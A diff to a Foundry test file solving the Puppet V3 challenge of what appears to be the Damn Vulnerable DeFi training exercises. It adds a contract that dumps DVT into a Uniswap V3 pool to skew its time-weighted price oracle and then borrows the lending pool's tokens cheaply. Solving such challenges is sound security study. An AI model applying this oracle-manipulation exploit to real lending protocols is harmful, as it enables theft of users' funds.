@@ -121,22 +121,29 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        ISwapRouter v3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        UniswapPoolBorrower borrower = new UniswapPoolBorrower(token, lendingPool);
         weth.deposit{value: player.balance}();
-        weth.approve(address(v3Router), type(uint256).max);
-        token.approve(address(v3Router), type(uint256).max);
-        v3Router.exactInputSingle(
-            ISwapRouter.ExactInputSingleParams({
-                tokenIn: address(token),
-                tokenOut: address(weth),
-                fee: FEE,
-                recipient: player,
-                deadline: block.timestamp,
-                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
-                amountOutMinimum: 0,
-                sqrtPriceLimitX96: 0
-            })
-        );
+        weth.transfer(address(borrower), PLAYER_INITIAL_ETH_BALANCE);
+        token.transfer(address(borrower), PLAYER_INITIAL_TOKEN_BALANCE);
+        borrower.borrow();
+
+        // Or alternatively, swap DVT for WETH using SwapRouter, address can be found at https://docs.uniswap.org/contracts/v3/reference/deployments/ethereum-deployments
+        // ISwapRouter v3Router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        // weth.deposit{value: player.balance}();
+        // weth.approve(address(v3Router), type(uint256).max);
+        // token.approve(address(v3Router), type(uint256).max);
+        // v3Router.exactInputSingle(
+        //     ISwapRouter.ExactInputSingleParams({
+        //         tokenIn: address(token),
+        //         tokenOut: address(weth),
+        //         fee: FEE,
+        //         recipient: player,
+        //         deadline: block.timestamp,
+        //         amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+        //         amountOutMinimum: 0,
+        //         sqrtPriceLimitX96: 0
+        //     })
+        // );
 
         uint256 waitedTime = 0;
         while (waitedTime < 115){
@@ -156,6 +163,8 @@ contract PuppetV3Challenge is Test {
         token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
+    // Returns the amount of WETH you get for each DVT, using the same logic as in PuppetV3Pool#_getOracleQuote.
+    // The key to understand the bug is that the manipulated price has to stay long enough to have influence on the `arithmeticMeanTick`
     function getPrice() public view returns (uint256) {
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
         (int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapPool), secondsAgo: 10 minutes});
@@ -179,5 +188,49 @@ contract PuppetV3Challenge is Test {
 
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
+    }
+}
+
+contract UniswapPoolBorrower{
+    uint256 constant UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100e18;
+    uint256 constant UNISWAP_INITIAL_WETH_LIQUIDITY = 100e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 110e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+    uint24 constant FEE = 3000;
+
+    WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
+    DamnValuableToken token;
+    PuppetV3Pool lendingPool;
+    address player;
+
+    constructor(
+                DamnValuableToken _token,
+                PuppetV3Pool _lendingPool
+    ){
+        token = _token;
+        lendingPool = _lendingPool;
+        player = msg.sender;
+    }
+
+    function borrow() external {
+        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        token.approve(address(uniswapPool), type(uint256).max);
+        uniswapPool.swap(
+            address(this),
+            true, // swap DVT for WETH
+            int256(PLAYER_INITIAL_TOKEN_BALANCE), // in amount
+            4295128740, // sqrtPriceLimitX96
+            abi.encode(address(this)) // data
+        );
+
+        weth.transfer(player, weth.balanceOf(address(this)));
+        token.transfer(player, token.balanceOf(address(this)));
+    }
+
+    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory data) external {
+        require(amount0 > 0, "Expected to swap DVT for WETH");
+        token.transfer(msg.sender, uint256(amount0));
     }
 }
